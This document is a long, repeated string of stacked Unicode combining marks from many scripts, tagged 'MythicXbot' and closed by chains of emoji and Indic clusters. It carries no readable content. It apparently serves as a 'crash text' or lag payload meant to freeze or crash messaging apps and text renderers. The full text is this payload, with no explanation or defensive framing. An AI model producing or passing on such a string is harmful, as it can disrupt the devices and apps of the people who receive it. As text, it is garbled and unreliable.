๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్